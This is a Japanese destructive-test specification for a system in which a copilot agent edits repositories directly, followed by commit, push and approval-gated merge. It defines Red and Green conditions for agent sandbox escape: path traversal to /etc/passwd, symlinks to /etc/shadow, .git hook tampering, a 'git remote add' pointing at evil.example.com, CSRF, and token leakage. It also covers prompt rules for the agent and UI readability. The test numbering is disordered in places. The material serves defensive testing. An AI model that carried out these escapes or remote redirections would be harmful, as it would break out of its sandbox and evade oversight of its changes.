# 丸投げシステム (Maru-nage v2) Phase 6 直接編集アーキテクチャ 破壊的テスト設計書

## 0. 目的

本書は、Phase 6（直接編集アーキテクチャ）の設計を論理的に破壊し、RED テストで保証すべき異常系と合格基準を定義する。対象設計書は `docs/phase6-direct-edit-design.md`。

## 1. テスト方針

1. Phase 4/5 の artifact 経由間接編集から直接編集への転換に伴い、**新たに導入される暗黙の前提**が崩れた時に安全に失敗することを定義する。
2. copilot が直接ファイルを編集するため、sandbox 脱出の防御ポイントが「diff パス検証」から「`git diff --name-only` の出力検証」に移る。この検証が崩れた場合に安全側に倒れることを最優先で保証する。
3. commit/push を各フェーズ終了時に行う新フローでは、git コマンド失敗・認証障害・リモート拒否を task 単位で閉じ込め、worker を巻き込まないことを検証する。
4. 旧 Phase 4 prompt ガードレール（「ファイル編集するな」）が完全に撤去され、新 prompt 方針に置き換わっていることを保証する。
5. `GITHUB_TOKEN` やその他の秘密情報が commit content、commit message、`logs` に平文で残らないことを保証する。

## 2. 破壊シナリオと合格基準

### DT-01: 旧 prompt ガードレールが残存

- 攻撃シナリオ: `_build_prompt()` が Phase 4 の「ファイル編集するな」「git push するな」「提案テキストだけ返せ」のガードレール 5 行を含んだまま copilot を呼び出す。copilot はファイル編集を行わず、artifact テキストのみ返す（旧挙動に退行）。
- Red 条件: ガードレール 5 行のうち 1 行でも prompt 内に残っている。
- Green 条件: `_build_prompt()` の出力に旧ガードレール 5 行が一切含まれず、「リポジトリのファイルを直接編集し、変更を完成させよ」相当の指示が含まれること。

### DT-02: prompt が「git commit / git push を実行するな」を欠落

- 攻撃シナリオ: 新 prompt から「git commit / git push は実行するな（システム側で行う）」の制約が欠落しており、copilot が自前で commit & push を行う。結果として、システム側の commit/push と二重実行になるか、copilot が意図しないブランチへ push する。
- Red 条件: prompt に「git commit / git push はシステムが行う」旨の制約がない。
- Green 条件: prompt に「git commit / git push は実行するな」が明示的に含まれること。

### DT-03: prompt が「リポジトリ外のファイルを編集するな」を欠落

- 攻撃シナリオ: prompt からリポジトリ外編集の禁止指示が欠落しており、copilot が `/workspace/{task_id}/` 配下の `artifacts/`、`patches/`、`system_docs_snapshot/`、またはまったく別のパスのファイルを編集する。
- Red 条件: prompt にリポジトリ外編集禁止の指示がなく、copilot が repo 外のファイルを変更しても sandbox 検証前に commit される。
- Green 条件: prompt に「リポジトリ外のファイルを編集するな」が含まれ、さらに DT-06 の sandbox 検証がバックストップとして強制されること。

### DT-04: `commit_and_push()` 呼び出し前に copilot が何も編集しなかった（変更なし）

- 攻撃シナリオ: copilot CLI が正常終了(exit 0)するが、リポジトリ内のファイルを一切変更しない。`git status --short` / `git diff --name-only` が空。
- Red 条件: 空 commit を作成して push する、または成功扱いで次フェーズへ進む。
- Green 条件: 変更なしを検知し、`phase_N_no_changes` を `logs` に記録する。空 commit は作成せず、設計 §2.1 に従い次フェーズへスキップ進行するか `blocked` へ遷移する（フェーズ固有ポリシーで決定）。

### DT-05: `validate_changed_files()` へ渡す `git diff --name-only` 出力に `..` がある

- 攻撃シナリオ: copilot が `.git` の内部操作またはシンボリックリンク経由で、`git diff --name-only` の出力に `../../etc/passwd` や `../other_task/repo/secret` を含むパスを差し込む。
- Red 条件: `..` を含む変更パスが sandbox 検証をパスし、commit & push される。
- Green 条件: `validate_changed_files()` が `..` セグメントを含むパスを拒否し、`blocked` へ遷移する。

### DT-06: `git diff --name-only` 出力に sandbox 外への絶対パスがある

- 攻撃シナリオ: `git diff --name-only` が `/etc/passwd` や `/workspace/other_task/repo/` などの絶対パスを返す。
- Red 条件: 絶対パスが sandbox 検証を通過し、commit される。
- Green 条件: 絶対パスを拒否し、`blocked` へ遷移する。

### DT-07: copilot が `.git/` ディレクトリ配下を変更

- 攻撃シナリオ: copilot が `.git/hooks/pre-commit` や `.git/config` を編集し、git hooks によるコード実行やリモート URL 書き換えを仕込む。`git diff --name-only` にこれらが現れるかは git の動作に依存する。
- Red 条件: `.git/` 配下の変更が commit される、または git 設定が改竄されたまま push が行われる。
- Green 条件: `validate_changed_files()` が `.git/` 配下への変更を検出して拒否するか、`git add -A` の前に `.git/` 変更を除外すること。`blocked` へ遷移する。

### DT-08: copilot がシンボリックリンクを作成して sandbox 外を参照

- 攻撃シナリオ: copilot が `/workspace/{task_id}/repo/link → /etc/shadow` のようなシンボリックリンクを作成し、そのリンク先がリポジトリに追加される。`git diff --name-only` にはリンクパスのみ表示される。
- Red 条件: シンボリックリンク経由で sandbox 外のファイルがリポジトリに含まれて push される。
- Green 条件: 変更ファイルの `realpath` を検証し、sandbox 外への参照を拒否して `blocked` へ遷移する。

### DT-09: commit 失敗 — `user.name` / `user.email` 未設定

- 攻撃シナリオ: コンテナ環境に `user.name` / `user.email` が設定されておらず、`git commit` が拒否される。
- Red 条件: 未処理例外が worker まで伝播する、または staged changes が放置される。
- Green 条件: commit 前に `user.name` / `user.email` をシステム既定値で設定するか、commit 失敗を捕捉して `blocked` へ遷移する。

### DT-10: commit message への秘密情報混入

- 攻撃シナリオ: task タイトルや `result_summary_md` に `GITHUB_TOKEN` やその他認証トークンが含まれており、それが commit message に挿入される。
- Red 条件: git history に秘密情報が平文で残る。
- Green 条件: commit message 生成時に Phase 4 同等のマスキング（`GITHUB_TOKEN`, `GH_TOKEN`, `COPILOT_GITHUB_TOKEN` の置換）を適用し、秘密情報を除去する。

### DT-11: push 認証失敗 — GITHUB_TOKEN 失効

- 攻撃シナリオ: `GITHUB_TOKEN` が失効しており、`git push origin {working_branch}` が認証エラーで失敗する。
- Red 条件: 無制限にリトライする、または commit 済み・push 未済の中途状態のまま task が `succeeded` 扱いになる。
- Green 条件: push 認証失敗を恒久障害として分類し、task を `blocked` に遷移させ、`logs` にエラー種別を残す。commit は成功しているため、次回リトライ時に再 commit せず push のみをリトライ可能な設計であること。

### DT-12: push がリモートに拒否される（ブランチ保護）

- 攻撃シナリオ: ブランチ保護ルール、force-push 禁止、または non-fast-forward により `git push` がリモートから拒否される。
- Red 条件: worker がハングする、または一時障害として無制限リトライする。
- Green 条件: リモート拒否を恒久障害として分類し、`blocked` へ遷移する。

### DT-13: commit 済みファイルに秘密情報が含まれる

- 攻撃シナリオ: copilot が編集したファイル内容に `GITHUB_TOKEN` の実値やサービスキーが埋め込まれている。commit & push 後に git history に秘密情報が永続化する。
- Red 条件: 秘密情報を含むファイルが commit & push され、git history に残る。
- Green 条件: commit 前に `git diff` の内容に対して秘密情報マスキングスキャンを適用し、検出時は `blocked` へ遷移する。または、Phase 4 の `_sanitize_response()` で対応済みの場合は、copilot の直接編集でも同等のスキャンが `commit_and_push()` 内で行われること。

### DT-14: workspace_path が不正（DB 不整合による sandbox 逸脱）

- 攻撃シナリオ: `tasks.workspace_path` が DB 操作で `/tmp/evil` や `/workspace/other_task/` に改変されている。copilot の `--add-dir` がこの不正パスを受け取り、不正ディレクトリ上で編集＋commit が走る。
- Red 条件: workspace 外のディレクトリで copilot 編集と commit/push が実行される。
- Green 条件: Phase 3/4 同等の sandbox 再検証を commit/push フロー開始前に実施し、不正パスなら `blocked` へ遷移する。

### DT-15: apply_artifact() の旧パスが残存

- 攻撃シナリオ: Phase 5 の `apply_artifact()` が非推奨化されず、何らかのコードパスから呼び出されて artifact 経由のファイル反映が発生する。直接編集と artifact apply が競合し、repo が不整合な状態になる。
- Red 条件: `apply_artifact()` が呼び出し可能な状態のまま残っている。
- Green 条件: `apply_artifact()` のコールサイト（`apply_artifact_for_task()` 含む）が削除されているか、明示的にエラーを投げて呼び出しを拒否すること。

### DT-16: remote 注入による push 先上書き

- 攻撃シナリオ: copilot が `git remote add malicious https://evil.example.com/repo.git` を実行し、後続の `git push` が意図しないリモートに向かう。
- Red 条件: clone 元以外のリモートへの push が発生する。
- Green 条件: `commit_and_push()` が push 先を常に `origin` とハードコードし、copilot による `git remote` 操作の結果に依存しないこと。

### DT-17: copilot が大量ファイルを変更（資源枯渇）

- 攻撃シナリオ: copilot が数千ファイルを変更し、`git add -A` → `git commit` でメモリ・ディスク・CPU を圧迫する。
- Red 条件: worker が OOM で死ぬか、ディスク枯渇で他 task を巻き込む。
- Green 条件: `validate_changed_files()` で変更ファイル数に上限を設ける。上限超過時は `blocked` へ遷移する。Phase 4 の応答サイズ上限と整合させる。

### DT-18: git 操作タイムアウト

- 攻撃シナリオ: `git push` がネットワーク障害で無期限にハングする。
- Red 条件: worker スレッドがハングし、lease 失効後に別 worker が同一 task を二重実行する。
- Green 条件: git 操作にタイムアウトを設定し、超過時は `blocked` へ遷移する。`subprocess.run(timeout=...)` で制御する。

### DT-19: フェーズ固有 commit のメッセージ形式不正

- 攻撃シナリオ: commit message のフォーマットがフェーズ番号やタスク ID を含む定型文を逸脱し、後続のログ解析やフェーズトラッキングを破壊する。
- Red 条件: commit message が空文字、改行のみ、または `git commit -m ""` で git がエラーを投げる。
- Green 条件: `commit_and_push()` がフェーズ番号とタスク ID を含む定型 commit message を生成し、空や不正な入力は安全なデフォルトへフォールバックする。

### DT-20: copilot CLI 実行は成功するが working_branch が未設定

- 攻撃シナリオ: task の `working_branch` が `NULL` / 空文字のまま copilot 呼び出し後の commit/push フローに入る。`git push origin ""` が予期しない動作をする。
- Red 条件: `git push origin` がデフォルトブランチに push するか、git がエラーを投げて worker を巻き込む。
- Green 条件: commit/push フロー開始前に `working_branch` が有効な値であることを検証し、無効なら `blocked` へ遷移する。

### DT-21: `waiting_approval` 以外の task に approve を送信

- 攻撃シナリオ: `POST /api/v1/tasks/{id}/approve` を `running`、`succeeded`、`blocked` 状態の task に送信する。
- Red 条件: merge が実行される、または task の状態が不正に遷移する。
- Green 条件: `409 Conflict` を返し、task 状態・git 状態に一切の副作用がないこと。

### DT-22: 存在しない task ID に approve を送信

- 攻撃シナリオ: `POST /api/v1/tasks/{id}/approve` に DB 上存在しない task ID を渡す。
- Red 条件: 500 Internal Server Error またはハンドルされない例外がスローされる。
- Green 条件: `404 Not Found` を返し、ログには操作対象不明アクセスを記録すること。

### DT-23: approve の二重送信（冪等性）

- 攻撃シナリオ: 同一 task に対して 2 回連続で approve を送信する。1 回目で merge + branch cleanup が成功し task が `succeeded` に遷移した直後に 2 回目が到着する。
- Red 条件: 二重 merge が発生する、または既に削除されたブランチの削除を試みてエラーを投げる。
- Green 条件: 2 回目の approve は task 状態が `waiting_approval` でないことを検出し、`409 Conflict` を返す。Git 側に追加の副作用は発生しないこと。

### DT-24: merge 競合 — merge target が working_branch 作成後に更新済み

- 攻撃シナリオ: `working_branch` 作成後に `main` ブランチに別の commit が push され、`git merge --no-ff` が衝突を報告する。
- Red 条件: merge が競合を無視して完了する、または競合状態のまま push される。
- Green 条件: merge 競合を検出し、task を `blocked` に遷移させ、`merge_conflict` イベントを `logs` に記録すること。`working_branch` と merge target は変更前の状態を維持すること。

### DT-25: 承認時に保存済み target_ref が allowlist 外

- 攻撃シナリオ: 投稿時に target_ref として保存したブランチが、承認時点で allowlist から除外されている（allowlist 変更、環境変数 `MERGE_TARGET_ALLOWLIST` 更新等）。approve 処理は§2.7.3 step 1 で保存済み target_ref の allowlist 再検証を行うが、その検証が欠落している場合。
- Red 条件: allowlist 外のブランチへ merge が実行される。
- Green 条件: approve 処理開始時に保存済み target_ref の allowlist 再検証を行い、allowlist 外なら `merge_target_not_allowed` として拒否し、task は `waiting_approval` のまま残り、merge は実行されないこと。

### DT-26: 保存済み target_ref が承認時点で remote に存在しない

- 攻撃シナリオ: 投稿〜承認の間に元ブランチが remote から削除（またはリネーム）され、保存済み target_ref が指すブランチが存在しない状態で approve を実行する。
- Red 条件: ハンドルされない git エラー、または空ブランチへの push が発生する。自動フォールバックで別ブランチへ merge される。
- Green 条件: §2.7.4 item 6 に従い、`merge_target_not_found` 相当のエラーで task を `blocked` に遷移させ、別ブランチへの自動フォールバックは行わないこと。

### DT-27: merge target への push がリモートに拒否される（保護ブランチ）

- 攻撃シナリオ: merge target (`main`) がブランチ保護ルールにより push を拒否する。merge 自体は local で成功するが、`git push origin main` がリモートから拒否される。
- Red 条件: worker がハングする、または無制限リトライする。local repo に merge commit が残ったまま task が `succeeded` になる。
- Green 条件: push 拒否を検出し、task を `blocked` に遷移させ、`merge_push_rejected` イベントを `logs` に記録すること。

### DT-28: local working_branch 削除が失敗

- 攻撃シナリオ: merge 成功・push 成功後に `git branch -d {working_branch}` が失敗する（例: 現在 checkout 中のため削除不可）。
- Red 条件: task が `succeeded` に遷移し、local branch がゴミとして残る。
- Green 条件: task を `blocked` に遷移させ、`branch_cleanup_local_failed` イベントを `logs` に記録すること。merge 結果は remote に push 済みのため保全されること。

### DT-29: remote working_branch 削除のみ失敗（片肺故障）

- 攻撃シナリオ: merge 成功・push 成功・local branch 削除成功後に `git push origin --delete {working_branch}` がネットワーク障害で失敗する。
- Red 条件: task が `succeeded` に遷移し、remote に孤立した working_branch が残る。または local branch が失われ、再実行時に remote 削除だけをリトライする手段がない。
- Green 条件: task を `blocked` に遷移させ、`branch_cleanup_remote_failed` イベントを `logs` に記録すること。再実行時に local branch の不在を検出し、remote branch 削除のみを安全にリトライできること。

### DT-30: merge 未完了状態での branch cleanup 実行

- 攻撃シナリオ: バグまたは競合により、merge push が未完了の状態で branch cleanup が発動する。
- Red 条件: working_branch が削除され、merge されていない変更が消失する。
- Green 条件: cleanup は merge push 成功の確認後にのみ実行されること。設計 §2.7.3 の実行順序が保証され、push 成功前に branch 削除は発動しないこと。

### DT-30A: `waiting_approval` task だが working_branch が既に消失

- 攻撃シナリオ: task は `waiting_approval` のままだが、`working_branch` は既に local / remote の両方から削除されている。過去の部分成功、手動マージ、または状態更新失敗により発生する。
- Red 条件: `git diff origin/main...{working_branch}` が生の git エラーを返し、承認 UI が原因不明の失敗表示になる。approve を押すと追加の破壊的副作用が発生する。
- Green 条件: `diff` / `merge-targets` / `approve` API は `working_branch_not_found` を返す。フロントエンドはまず最新 task 状態を再取得し、task が `succeeded` または `blocked` に更新済みなら承認 UI を非表示にすること。task が依然 `waiting_approval` の場合のみ状態不整合メッセージを表示し、approve / reject をともに無効化すること。

### DT-30B: approve / reject 後に stale task state で承認パネルを再描画する

- 攻撃シナリオ: approve または reject 成功後、画面側が API 応答や最新 detail を使わず、押下前に保持していた `waiting_approval` task をそのまま `renderApprovalPanel()` へ渡す。
- Red 条件: merge / reject 自体は成功しているのに、その直後の diff 再取得で `working_branch_not_found` が表示され、承認済み task に対してさらに approve / reject を押せる。
- Green 条件: 操作成功後は最新 task 状態に基づいて detail を再描画し、`succeeded` / `blocked` task では承認パネルが表示されないこと。

### DT-30C: diff preview の背景色と文字色のコントラスト不足

- 攻撃シナリオ: diff preview に panel 既定色と近い配色が適用され、長い diff で可読性が著しく低下する。
- Red 条件: 背景と文字の輝度差が小さく、差分表示が読みにくい。承認判断に必要なレビュー品質を満たさない。
- Green 条件: diff preview 専用の高コントラスト配色と境界線が定義され、承認画面内でも即座に視認できること。

### DT-30D: approve / reject ボタンの視認性と配置が悪い

- 攻撃シナリオ: approve / reject ボタンが単純な既定スタイルのまま近接配置され、優先操作と危険操作の区別が付きにくい。
- Red 条件: ボタンの見た目や配置から操作の意味が判別しづらく、誤操作を誘発する。
- Green 条件: approve は primary、reject は danger として視覚的に分離され、アクション列全体が承認パネルの一部として整理されていること。

### DT-31: `waiting_approval` 以外の task に reject を送信

- 攻撃シナリオ: `POST /api/v1/tasks/{id}/reject` を `running`、`succeeded`、`blocked` 状態の task に送信する。
- Red 条件: task の状態が不正に遷移する、または merge・branch cleanup が実行される。
- Green 条件: `409 Conflict` を返し、task 状態に副作用がないこと。

### DT-32: reject が merge や branch cleanup を実行しない

- 攻撃シナリオ: reject 処理のコードパスに merge ロジックまたは branch cleanup ロジックが混入している。
- Red 条件: reject 時に merge、push、またはブランチ削除が実行される。
- Green 条件: reject は `blocked` への状態遷移と却下理由のログ記録のみを行い、git 操作は一切実行しないこと。

### DT-33: diff API — working_branch が null / 未設定の task

- 攻撃シナリオ: `GET /api/v1/tasks/{id}/diff` を local `workspace_path` task（`working_branch` なし）に対して呼び出す。
- Red 条件: ハンドルされない `NoneType` エラーまたは 500 が返る。
- Green 条件: `400 Bad Request` または `404 Not Found` を返し、diff 対象外であることを明示すること。

### DT-34: diff API — 保存済み target_ref が remote に存在しない

- 攻撃シナリオ: task に保存された target_ref が指すブランチが remote から削除された後に `GET /api/v1/tasks/{id}/diff` を呼び出す。diff API はクエリパラメータではなく保存値を使うため、リクエスト改竄では発生しないが、remote 側の変化で発生する。
- Red 条件: ハンドルされない git エラーまたは 500。
- Green 条件: `404 Not Found` を返し、保存済みの元ブランチが存在しない旨をレスポンスに含めること。

### DT-35: branches API がフィルタされていないブランチ一覧を返す

- 攻撃シナリオ: `GET /api/v1/repositories/branches?repository_url=...` で remote に `main`、`develop`、`feature/xxx`、`release/v1`、`hotfix/yyy` など多数のブランチが存在する。API がフィルタなしで全ブランチを返す。
- Red 条件: allowlist 条件を満たさないブランチが候補として返される。
- Green 条件: allowlist 条件（例: `main`, `develop` などの保護対象のみ、またはパターンマッチ）を満たすブランチのみが返されること。

### DT-36: approve / reject への CSRF 攻撃

- 攻撃シナリオ: 外部サイトから `POST /api/v1/tasks/{id}/approve` を `fetch()` で送信する。
- Red 条件: approve が実行され、merge が完了する。
- Green 条件: CSRF 対策（Origin ヘッダ検証、SameSite Cookie、またはトークン検証）により、外部オリジンからのリクエストが拒否されること。

### DT-37: local workspace_path task が waiting_approval に遷移する

- 攻撃シナリオ: local `workspace_path` task（GitHub clone ではない）がバグにより `waiting_approval` に遷移する。Dashboard で approve を試みると merge target や working_branch がないため操作不能に陥る。
- Red 条件: local task が `waiting_approval` に遷移し、task が進行不能のまま放置される。

### DT-57: orchestration 一覧が child task を重複表示する

- 攻撃シナリオ: Dashboard 一覧 API が root task と child task を同時に返し、1 件の orchestration が複数行に分裂して表示される。
- Red 条件: 同一 `root_task_id` 配下の child task が一覧に現れ、進捗が「同じ失敗の繰り返し」に見える。
- Green 条件: 一覧 API は `parent_task_id IS NULL` の root task のみを返し、child task は detail API の `subtasks` としてのみ表示される。

### DT-58: phase 1 以降が phase 0 と同一 prompt で実行される

- 攻撃シナリオ: prompt 生成器が `phase` と `task_type` を無視し、phase 0 と phase 1 以降で同一の汎用 instruction を返す。その結果、phase 1 が設計ではなく phase 0 と同じ壁打ちや実装を再実行する。
- Red 条件: phase 0 / phase 1 の prompt が phase 固有ラベルや責務説明を含まず、事実上同一になる。
- Green 条件: prompt に `phase` と phase 固有責務が含まれ、phase 1 では設計更新、phase 2 では破壊テスト設計、phase 3 では RED 作成を要求すること。
- Green 条件: local task は `waiting_approval` を経由せず直接 `succeeded` へ遷移するか、コード上 `waiting_approval` への遷移条件が GitHub clone task 限定であることが保証されること。

### DT-59: subtask アコーディオンの初期状態が expanded

- 攻撃シナリオ: root task 詳細画面で subtask アコーディオンの初期状態が collapsed ではなく expanded で描画される。多数の phase task がある場合、詳細画面が長大になり、特定 subtask の確認に過度なスクロールが必要になる。
- Red 条件: ページロード時に全 subtask アコーディオンが展開されており、「初期非展開」の設計意図に反する。
- Green 条件: 全 subtask アコーディオンが初期状態で collapsed であること。ユーザーの明示的クリックでのみ展開されること。§2.7.6 item 3「初期状態ではすべて collapsed とする」が遵守されること。

### DT-60: アコーディオンヘッダに LLM モデル名が表示されない

- 攻撃シナリオ: subtask アコーディオンのヘッダに phase 番号、task_type、status は表示されるが、LLM モデル名が省略されている。ユーザーが全 subtask を個別に展開しないとモデル名を確認できない。
- Red 条件: アコーディオンヘッダに `llm_model` が表示されない。
- Green 条件: アコーディオンのヘッダに `llm_model` が表示されること。null / 空の場合は「N/A」または「-」を表示し、ヘッダが崩れないこと。§2.7.6 item 4「ヘッダには少なくとも phase 番号、task_type、status、LLM モデル名」が遵守されること。

### DT-61: アコーディオン展開領域に handoff_message が表示されない

- 攻撃シナリオ: subtask を展開しても handoff_message が描画されず、phase 間でどのような情報が伝達されたか確認できない。
- Red 条件: 展開領域に `handoff_message` の表示領域が存在しないか、フィールド自体が描画されない。
- Green 条件: 展開領域に `handoff_message` がラベル付きで表示されること。null / 空の場合は「引き継ぎ事項なし」等のプレースホルダを表示すること。§2.7.6 item 5「展開領域には phase_summary, handoff_message, result_summary_md, 主要ログを表示する」が遵守されること。

### DT-62: root task 詳細画面にユーザー投稿本文が表示されない

- 攻撃シナリオ: root task の詳細画面にユーザーが投稿した instruction が一切表示されず、タスクの目的を把握するには DB を直接参照するしかない。
- Red 条件: 詳細画面に instruction / 依頼本文が表示されない。
- Green 条件: root task の詳細画面に「依頼本文」としてユーザー投稿時の instruction が表示されること。§2.7.6 item 1「root task detail API は instruction を返し、詳細画面上で「依頼本文」として表示する」が遵守されること。

### DT-63: subtask の llm_model が null / 空文字の場合にヘッダ描画が崩壊

- 攻撃シナリオ: child task の `llm_model` が null または空文字列で保存される。フロントエンドのアコーディオンヘッダ生成処理が `null` テキストを表示するか、テンプレートリテラルで `undefined` が結合される。
- Red 条件: ヘッダに `null` / `undefined` のリテラル文字列が表示される。
- Green 条件: `llm_model` が null / undefined / 空文字の場合、ヘッダに「N/A」等のフォールバック表示を適用し、リテラルの null / undefined を描画しないこと。

### DT-64: instruction の改行が保持されない

- 攻撃シナリオ: ユーザーが複数行の instruction を投稿するが、フロントエンドが改行を無視して 1 行に結合表示する。依頼内容の構造が失われ、可読性が著しく低下する。
- Red 条件: instruction 内の `\n` が無視され、テキストが 1 行で描画される。
- Green 条件: instruction 表示領域で `white-space: pre-wrap` または同等の CSS が適用され、改行が保持されること。§3.1.1「表示時は改行保持を優先する」が遵守されること。

### DT-65: handoff_message の改行が保持されない

- 攻撃シナリオ: LLM が複数行の handoff_message を生成するが、アコーディオン展開領域で改行が無視され 1 行で描画される。
- Red 条件: handoff_message 内の改行コードが無視され、テキストが 1 行に結合される。
- Green 条件: handoff_message 表示領域で `white-space: pre-wrap` または同等の CSS が適用され、改行が保持されること。

### DT-66: subtask が 0 件の root task で詳細画面がエラーにならない

- 攻撃シナリオ: root task が作成直後で child task が 1 件も生成されていない状態（phase 0 生成前の瞬間、またはトランザクション失敗時）。detail API が空の `subtasks: []` を返し、フロントエンドが空配列のアコーディオン描画を安全に処理する必要がある。
- Red 条件: subtasks が 0 件の場合にフロントエンドがエラーをスローするか、「undefined is not iterable」等の例外が発生する。
- Green 条件: subtasks が空配列の場合、「サブタスクなし」等のプレースホルダを表示し、ページが正常動作すること。

### DT-67: Dashboard detail の主要見出しが英語のまま表示される

- 攻撃シナリオ: Dashboard task detail 画面のセクション見出しが `Subtasks`, `Phase Summary`, `Handoff Message`, `Result`, `Logs` の英語表記のまま描画され、日本語ベースの情報設計要件（§2.7.6 item 9）に反する。
- Red 条件: detail 画面の主要見出しが英語のまま表示され、「依頼本文」「サブタスク」「引き継ぎ事項」「結果」「ログ」の日本語ラベルが適用されていない。
- Green 条件: §2.7.6 item 9 に従い、主要見出しに日本語第一表記が適用されていること。英語メタデータ（phase 番号、model 名）は識別用途に限定されること。

### DT-68: 依頼本文 / handoff message / result のテキストブロックが補助メタデータと同じスタイルで描画

- 攻撃シナリオ: instruction、handoff_message、result_summary_md が、phase 番号・status・LLM model 名などの補助メタデータと同じフォントサイズ・余白・背景で描画される。視覚的な優先度が区別できず、ユーザーが「どこを読めばよいか」が即座に分からない。
- Red 条件: テキストブロック（instruction / handoff / result）に補助メタデータと区別する専用スタイル（padding, background, border, line-height 差）が適用されていない。
- Green 条件: §2.7.6 item 8 に従い、instruction / handoff_message / result_summary_md が他の補助情報より視覚的に強いテキストブロックとして配置され、読み始める場所が即座に分かること。

### DT-69: テキストブロックの行間・余白が不十分で「読む領域」が分離されない

- 攻撃シナリオ: テキストブロックに line-height: 1.0 や padding: 0 が適用（または未指定）され、テキストが密集して表示される。長文の instruction や handoff_message が読みにくい。
- Red 条件: テキストブロックの line-height、padding が周囲のメタデータ表示と同等で、「読み物向けパネル」としての可読性改善がない。
- Green 条件: §2.7.6 item 10「行間・padding・背景色・境界線・最大高さを調整した読み物向けパネル」が実装され、テキストブロックが明確に「読む領域」として分離されていること。NF-14 が遵守されること。

### DT-70: テキストブロックの背景コントラスト不足

- 攻撃シナリオ: instruction / handoff_message / result_summary_md の背景色が周囲のパネル背景色と同一または近似で、テキスト領域の境界が視覚的に不明瞭。ユーザーが本文領域の開始・終了を認識しづらい。
- Red 条件: テキスト領域が周囲から背景色または境界線で分離されておらず、「ここが本文」が一目で分からない。
- Green 条件: テキストブロックに周囲と十分に区別できる背景色または境界線が適用され、NF-14「背景コントラスト」の要件が遵守されること。

### DT-71: subtask 展開領域の内部ラベルが英語のまま

- 攻撃シナリオ: subtask アコーディオン展開領域内のフィールドラベルが `Phase Summary`, `Handoff Message`, `Result`, `Logs` の英語表記のまま。日本語ベースの UI/UX 要件に反する。
- Red 条件: 展開領域のラベルに英語が使用されており、日本語ラベル（要約、引き継ぎ事項、結果、ログ）が適用されていない。
- Green 条件: §2.7.6 item 11 に従い、展開領域の表示ラベルが「要約」「引き継ぎ事項」「結果」「ログ」に置換されていること。NF-15 が遵守されること。

### DT-72: empty state / helper text が英語で表示される

- 攻撃シナリオ: subtask なし時に "No subtasks" / "No data available"、handoff なし時に "No handoff message"、エラー時に "Error loading data" 等の英語テキストが表示される。
- Red 条件: empty state、helper text、プレースホルダに英語テキストが使用されている。
- Green 条件: §2.7.6 item 12「empty state と helper text は日本語で記述し、エラー時も英語由来の内部用語をそのまま露出しない」が遵守されていること。

### DT-73: detail 画面の情報階層が設計順序に従わない

- 攻撃シナリオ: detail 画面のセクション順が「ログ → 依頼本文 → サブタスク」や「結果 → 概要 → サブタスク」のように設計で定めた情報階層に反する。日本語の自然な読み順に合わないため、ユーザーが情報を追跡しにくい。
- Red 条件: detail 画面のセクション表示順が「概要 → 依頼本文 → サブタスク → ログ/結果」に従っていない。
- Green 条件: NF-16「root detail と subtask detail の情報階層は概要 → 依頼本文 → サブタスク → ログ/結果の順で安定させる」が遵守されていること。

### DT-74: エラー表示で英語由来の内部用語がそのまま露出する

- 攻撃シナリオ: API エラー応答時に `working_branch_not_found`、`merge_target_not_found`、`orchestration_payload_invalid` 等の内部エラーコードがモーダルダイアログやメッセージ領域にそのまま表示される。
- Red 条件: ユーザー向けメッセージにサニタイズされていない英語内部用語が露出し、エラー内容を日本語で理解できない。
- Green 条件: §2.7.6 item 12 に従い、エラー時もユーザー向けメッセージは日本語で記述し、英語由来の内部用語はログにのみ記録すること。

### DT-75: `.detail-reading-panel` の背景色と本文文字色が近似

- 攻撃シナリオ: `.detail-reading-panel` の `background` と `color` が同系色（例: 背景 `#f8f1e3` に対して本文 `#a89270` など明度差が小さい色）で描画される。依頼本文・引き継ぎ事項・結果の長文テキストが背景に埋もれ、内容を判読できない。
- Red 条件: `.detail-reading-panel` の CSS で `background` と `color` が定義されておらず UA 既定に依存する、または background と color のコントラスト比が 4.5:1 未満の近似色ペアで指定されている。
- Green 条件: `.detail-reading-panel` の CSS で `color` に十分に濃い色（例: `#3a2f22` 相当の暗色）を明示的に指定し、`background` に白寄りまたは淡色（例: `#faf6ef` 相当）を指定すること。§2.7.6 item 13「本文レイヤは濃色文字、背景は白寄りまたは淡色寄りに固定」が遵守されること。

### DT-76: 見出し・本文・補助文言の色階層が未分離

- 攻撃シナリオ: `.detail-section-title`（見出し）と `.detail-reading-panel`（本文）と補助メタデータ（`.detail-meta dt` / badge 類）がすべて同一の `color` 値で描画される。結果として色階層が存在せず、ユーザーが「まず見出しを見つけ → 本文を読み → 補助情報を参照する」という段階的な読み順を取れない。
- Red 条件: `.detail-section-title` と `.detail-reading-panel` と補助メタデータの `color` 値が同一、または 3 者間の明度差が実質的にゼロで階層として機能していない。
- Green 条件: 見出し（`.detail-section-title`）は本文より強い色、本文は補助文言・メタラベルより濃い色、補助文言は背景に埋もれない程度の弱い色を持ち、3 層の色階層として機能すること。§2.7.6 item 13「見出しは本文よりさらに強い色で視点の起点を作る」§1.1 NF-17 が遵守されること。

### DT-77: hover / focus 状態で本文色が背景に近づく

- 攻撃シナリオ: `.detail-reading-panel:hover` や `:focus-within` で `color` を薄くする、または `opacity` を下げる CSS ルールが適用され、ホバー中に本文の可読性が低下する。ユーザーがポインタを含む読み物ではマウスが常にパネル上にあるため、読んでいる間ずっとコントラストが劣化する。
- Red 条件: `.detail-reading-panel` の hover / focus 擬似クラスで `color` が薄色へ変更される、または `opacity < 0.8` が適用されて本文コントラストが低下する。
- Green 条件: hover / focus の視覚差は border、shadow、surface tint（background の微調整）で表現し、`color`（本文文字色）は通常時と同値を維持すること。§2.7.6 item 14「hover や active 相当の状態変化が入る場合も本文色は維持する」§1.1 NF-18 が遵守されること。

### DT-78: disabled 表示で本文が読めなくなる

- 攻撃シナリオ: task が `succeeded` / `blocked` に遷移した後の detail 画面で、読み物パネルに `opacity: 0.3` や `color: #ccc` 相当の disabled スタイルが適用され、完了済みタスクの instruction / handoff_message / result が判読困難になる。
- Red 条件: disabled 相当の表示で `.detail-reading-panel` の本文コントラストが通常時より大幅に低下し、テキスト内容を読めない。
- Green 条件: disabled 表示でもテキスト内容は読めること。操作不能を示す視覚手段として border の薄色化や surface tint のグレー化を用い、本文文字色そのものは `opacity: 0.65` 以上を維持すること。§2.7.6 item 14「disabled 表示では本文を薄くしすぎず、操作不能であっても内容は読めることを優先する」が遵守されること。

### DT-79: `.detail-reading-panel` の border / shadow が本文色と競合

- 攻撃シナリオ: `.detail-reading-panel` の `border` や `box-shadow` に本文テキストと同じ濃色が使われ、パネル装飾とテキストが溶け合って可読性を損なう。あるいは `box-shadow` が大きすぎてテキスト端が影に埋もれる。
- Red 条件: `border-color` や `box-shadow` の色が本文 `color` と同値で、視覚的にテキストと装飾が区別しにくい。
